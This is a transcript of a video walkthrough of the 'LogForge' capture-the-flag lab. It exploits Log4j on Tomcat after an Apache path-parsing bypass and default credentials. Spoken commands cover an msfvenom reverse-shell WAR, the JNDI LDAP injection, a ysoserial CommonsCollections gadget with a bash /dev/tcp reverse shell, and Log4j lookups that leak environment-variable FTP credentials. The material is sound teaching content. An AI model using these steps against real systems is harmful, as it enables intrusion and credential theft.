 what's going on youtube this is ipsec i'm doing log ford from the uhc december finals which apparently log forge is the correct way to pronounce log4j but i've never heard anyone ever call it that that being said this box is tomcat running behind apache and apache is configured to block access to slash manager host manager and admin so it makes getting access to the tomcat manager interface difficult without a url parsing bug from 2018. you do that use the default credential of tomcat tomcat to get into the manager interface which you try to upload a war file but you can't because the maximum file size is set to one byte however tomcat has been configured to use log4j for its logging so you can do that to get code execution on the box there is one trick though it's running an up-to-date version of java so you have to use wiser serial create a gadget around the common collections payload to do that code execution on the box it's running a custom ftp server written in java and you decompile it to see that it's putting its credentials and environment variables so you have to use log4j again to leak that with that being said let's jump in as always we start with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats print the nmap directory and call it log forge and then the ip address of 192 168 58.165 and i know it's a weird ip address it's running off my home network not hacked the box yet so that's why that is looking at the results we see a few ports are open there are also filtered ports but first the open ports ssh on port 22. its banner tells us it's an ubuntu server then we have http on port 80. it says it's running apache httpd and also ubuntu and then we have the filtered ports ftp on 21 and then 8080 which is the alternate http port which often runs applications and normally when i see this i think there's some type of reverse proxy going on because 80 is forwarded to 8080. additionally if i only saw ssl that would also be the case because a lot of people won't put like as a cell on node.js which may listen on 8080 instead they put nginx or apache in front of it put ssl there and then just forward the traffic to node.js so with that being said let's take a look at what's listening on 192 168 58 165 and we see it's just a page that says uhc the ultimate hacking championship i'm going to press ctrl u look at the source code to see if there's anything there we don't really see anything so if we try going to a different page i'm going to try like slash admin we get a forbidden if i do like a page that doesn't exist we get a weird error message this is a error message from apache tomcat and if i look at my network we look at this look at the response headers we can see the server says apache yet the error message says it's tomcat so we do have a case of a reverse proxy going on and if you look at the orange side presentation from like 2018 i think it's black cat could be defcon i won't say black cat uh breaking personal logic this one it goes all into this attack if we search the presentation for this we can see it i'm sure if you search ipsec.rocks there's another box that does this but essentially we send it this on apache and apache is going to kind of ignore it but it'll still be sent to tomcat so let's just do this out and as i do it it may make more sense so i'm going to do slash manager and we see it is forbidden because apache setup to block access to the tomcat manager now if i do ipsec which doesn't exist but we do slash dot dot semicolon then manager uh we actually have to put a trailing slash on that so ipsec slash dot dot semicolon manager then a trailing slash so a browser doesn't do path normalization and get rid of all that it asks for a credential so now we could log in with default credentials of tomcat tomcat and login there's also something else in that presentation that talks about doing it a different way and that is just a semicolon name is equal to anything and then slash manager is another bypass i probably forgot to do that again so name please subscribe manager always remember the trailing slash and we get in so what's happening here is apache has set up to say anything that begins with manager for bid because we don't want to allow remote access what's happening is we put this semicolon name equals please subscribe and apache reads this as a url but when it makes its way to tomcat tomcat's like well this isn't a url and gets rid of it and then goes down the normal route logic and says oh you wanted to go to manager html so that's what's going on there the default creds tomcat is always tomcat tomcat so we can log in and see just default credentials the first thing whenever you log into a tomcat instance is probably try to deploy a war file so the easiest way to do that is through msf venom so we do msf venom dash p java jsp shell reverse tcp lhost is equal to my ip address so let's get that 192 168 58 230 l port that will be 9001 format is a war file and dash o shell.war and not word war and if you want to know more about that i'd highly recommend going to ipsec dot rocks if you type like war file we can see in the jerry file we mainly created this without using msf venom with the file generated we can now go over to tomcat and try to deploy it so we try to deploy shell.war and we get a fail message if we look over we can see its maximum size available to upload is set to one byte so good luck finding something to download and execute that is under one byte big we gotta find a different option and tomcat is a java application and while it's not default vulnerable to log4j because it doesn't use it there is a way to configure tomcat to use log4j and if we google it we can see it is a supported thing here so if someone decided to have tomcat use log4j then it suddenly becomes vulnerable so let's try that payload i'm going to type it in a terminal so we don't have any weird line wrapping but it's jndi then ldap then i p address so 192 168 58 230 and then any port you want and we can say please subscribe so we can send this on over copy we can put it in any field we want and of course we need to listen on 9001 send it and we see the server hangs because it went to netcat now the weird thing is we don't see please subscribe because it's trying to complete some type of handshake before it sends that url because it's not http it's this weird jndi ldap protocol so we can't just get this parameter of please subscribe easily but we will show that at the end of the video because that's involved in the privacy instead i want to just get code execution on this and if we googled jndi exploit kit twitter currently it goes to this post i'm sure like if you're doing this a month after i record this will no longer be the first result but this post says everything we need to do it uses why yso serial modified with some parameters and then sets up this jndi server and gets code execution so let's just do that first we have to understand what the difference between why so serial and why so serial modified is so let's go to the page and if you read the description uh he talks about it right here that says the default why serial does some weird things so like redirections don't work and this makes it harder for us to do things like a reverse shell this is a solution to that so that's why we use this it's mainly for like making the reverse shell or the options more compatible with the first shell so let's get clone this and then the other thing is the jndi exploit kit github and we want to download this so let's go into why so serial modified because we first have to create the payload i'm gonna go into target java dash jar why so serial dash h for help and that doesn't work let's just try the dash modified version okay awesome so we have this so we want to do a payload and common collections is always a good starting point now he did five in the screenshot so that's the one i'm going to do if five didn't work um i would probably try four that may sound illogical but this is testing against common collections version 3.1 and four would be version 4.0 so that's why i would actually try four next but i just try a bunch of these so let's do commons collections five and then bash and then reverse shell so bash dash i dev tcp uh 192 168 58 230 i think it's my ip 9001 0 at and 1. like that now you may be thinking why don't i do the bash c before this and that's because we know bash is already calling this because of this parameter and then the next thing we do is just write the payload so let's write that to uhc um logforge then we'll call this cc5.ser for serialized object and cc5 is for common collections 5. i'm going to do less just to view it we see it begins with aced which is the magic bytes for java serialized object and it has a bunch of java e things so that looks fine the main reason i did it is i saw all these warnings so i want to make sure it actually wrote something so the next piece to this is the jndi exploit kit so we go here go to target and then java dash jar jndi exploit kit see snapshot try all h looks like it works so what parameters do we need we need to stand up a ldap server and before i get too far down i just want to make sure my ip address is what i thought it was 230 that is correct so we can say 192 168 58 230 because that's where we want the listener and then 1389 because that's the port for the ldap and dash p for the serialized object we want to send i'm going to send uhc log forge cc5 dot serialized or dot ser so this is now listening and we see various jdk versions now i'm going to assume tomcat is installed with um apt or package manager it's probably running the latest version of java so we're going to try this url if this doesn't work i'd probably just go up the list we can also as we'll see later in the video extract the exact java version that's running but let's just try this uh i'm going to go back into my directory and see lvmp 9001 go back to this do we have this jdi payload still set up we do get rid of please yeah let's just type it so uh jndi ldap yeah i copied some of it go back here grab this boom so that's gonna be the payload we want to send send it we have it send an object and we get a shell on the box so i'm going to do python 3 c import pty pty dot spawn bin bash so we have a proper terminal setup and then sdty raw minus echo semicolon fg hit enter twice so we get back on it now like exporting term is equal to x term so i can clear the screen and the first thing i want to do is look at those filtered ports namely 21 that we couldn't see on nmap so i'm gonna do ss lntp to show up in ports grab 121 and we do see it is indeed running so i'm gonna do ps ef and then i'm gonna search for ftp and we see it is running and we could also if we wanted to trace like the parent process so this is pid this is parent so this parent process 1143 this process parent process 1142 and we can go up to see all of these related so cron runs it executes bash which executes a script that script executes uh java we could also do the dash dash forced flag and it's truncating this i think if we fixed a terminal it would work but looking at this we can see it visualized this way and out of curiosity sdty dash a we want to set rows 26 columns 185. so stty rows 26 calls i always can't remember that 105 like that and now we see more of the output so our terminal is somewhat fixed we could probably do less dash capital s and let's see do we have the entire thing yeah if we hit the right arrow we could see other things so here's that cron we can see cron runs cron starts and it goes down this chain and hit right to see the rest but that's not really that important what is important is we know that um java is running and it's running as it's running the ftp server so we should test ftp localhost tested this is vulnerable to um log4j so jndi ldap then 192 168 58 230 9001 we can say please subscribe doesn't really matter what we put here nc lvmp 9001 and we get a connection so we know this java server is vulnerable now the issue with this and we're not going to do it too much troubleshooting is it doesn't have any vulnerable gadgets that yso serial knows about so we can't just use like common collections and exploit it that way additionally it's running a up-to-date version of java so we can't just do the traditional build a java class and have it execute that way this challenge we need to get the source code of it or actually we can go into a fun unintended solution real quick um i had just googled um like java ftp server and then asked rahan who is one of the challenge content creators of hack the box who's more familiar with java than me if you wouldn't mind adding log4j in the application and we did that to make this vulnerable service we didn't test that the application we based everything off of wasn't vulnerable to begin with and if we just log in with something it looks like we failed but we didn't we do dir we are now in roots home directory and we could get root.text so that was a hilarious vulnerability unintended that we decided to leave in it was found after the uhc competition but the intended way is to see that the jar file is on slash on the root of the server and we can read that so nc lvmp 9001 we'll write to ftp server.jar and then we will nc 192 168 58 230 which is my ip address on 9001 and direct that ftp server to that netcat socket then let it run for a few seconds trust that it's finished copying and md5 sum the file so we md5 summit to make sure we copied the whole thing and we see a b starts with and ends with a e starts with a b ends with a e so we assume this is the correct file now my favorite way for decompiling this right now is just jd gui so i'm going to execute jdguy.jar and i'm sure if you go to ipsec.rocks you'll be able to find a bunch of other ways to do it like jad and things like that so let's open the jar file just go to open ftp server.jar and we can see the log4j files here but also we have this ftp server if i go to the server.class we can see it's pretty much just turning up the socket if we go to worker.class scroll down we see two interesting variables ftp user and ftp password so if we extract these variables we should be able to log into the ftp server normally now this is our harder task on hack the box because we don't have internet normally you could just put this in a subdomain and use a website like canary tokens so canarytokens.org i think and generate a log for shell token and it would work you can't do a dns token because if you do this let's do a test real quick the dns token is completely static so you don't really get any information out of it but the canary tokens log for shell tokens a bit different than dns and if we do this here it gives us a way to put data into it so here we just replace hostname with um env colon ftp underscore user and when we view our tokens we would be seeing it i think huntress labs also has something similar but for this video we're just going to focus on extracting it now we know that the jndi exploit kit has the capability to view urls because that's how it differentiates between versions and at the beginning the video we said we couldn't just do it with netcat because we don't complete the handshake now the issue is the jndi server isn't verbose enough and if we request it like please subscribe it doesn't say a request for please subscribe happened so we could either modify the jndi exploit server or exploit kit or whatever it's called or we can just use wireshark so i'm going to just do wireshark so let's open up a new pane pseudo wireshark and i won't listen yet let's get ready to send the payload let's see this is the pain i want so we're connecting 130 389 and we want to do a nested jndi which it does support and i think we just do cis colon env or env colon ftp user the syst would be able to get like the user this is running as in the java version i think but let's do ftp user copy and we will hit enter a few times here so we know something connected and i'm just going to do ftp local host paste this exploit n and then stand up wireshark hit enter and then tcp.port is equal to one three eight nine and then follow stream and we can see it requested ipsec so the ftp user is probably ipsec so let's get ready to do this again but this time we want to do ftp pass so uh we gotta copy the payload and it's ftp password not pass paste password to semicolons our wireshark should now be running so on tcp stream none one three eight nine let's hit enter and we have a connection we can follow tcp stream and we see the password is log for j and v leakage so let's try logging in ftp localhost we don't specify anything it tells us we're not logged in immediately or an invalid user so if we do ipsec username is okay needs the password paste in the password and we have now logged in and we could write an ssh key or get root.text that way so that'll be actually not the video um i did say we'd go and explore like the class path and things like that so let's go do that first let's go copy the skeleton of our exploit so we just copy up to here and we can do cis java.class.path and then i'm going to do four dots and we can do cis dot uh not this i think just java colon version four dots and we can say java colon os so this should get us a lot of information about exploiting an application and it should be separated by four periods so if we screwed up any we'll see it's just blank so let's copy this ftp localhost set up wireshark again and see if we do all three of these when one big swoop so tcp stream is equal to 1389 that one on my clipboard that's annoying copy paste maybe that did not work oh i forgot to end the jndi we need two um brackets like that huh i wonder if i can't do all this nesting let's just stop it at java class path and one of these could actually be wrong and if one of them is wrong maybe that's what stops it so we're connecting login failed so we got this follow tcp stream and we can see there's probably no class path it's probably just the jar so that's why common collections is not there um let's see log tcp port it's equal to 13.89 we should restart this and do i still have that in my clipboard i do let's go over to tomcat and see what this looks like wireshark do not have two brackets closing it there we go follow tcp stream and we can see tomcat's class path so an actual java application does normally have a class path we can take a look at the other ones we try to do so the other one was um java colon version did i do that right or maybe not so let's try that no i did not put this in the user login tcp port we look at this follow tcp stream that was weird i'm going to restart this so copy this paste we can say tcp port 1389 follow stream and we get the java version 11 and this is open jdk so open jdk 11 is oracle java 8. a little bit of googling would have told you that so that's how we know to use the jdk8 payload um earlier we could also try the os so let's restart wireshark continue without saving tcp stream and then after the os we will call it a video os copy follow stream we can see the exact linux os or what it thinks or at least the kernel so that'd be the video hope you guys enjoyed it take care and i will see you all next time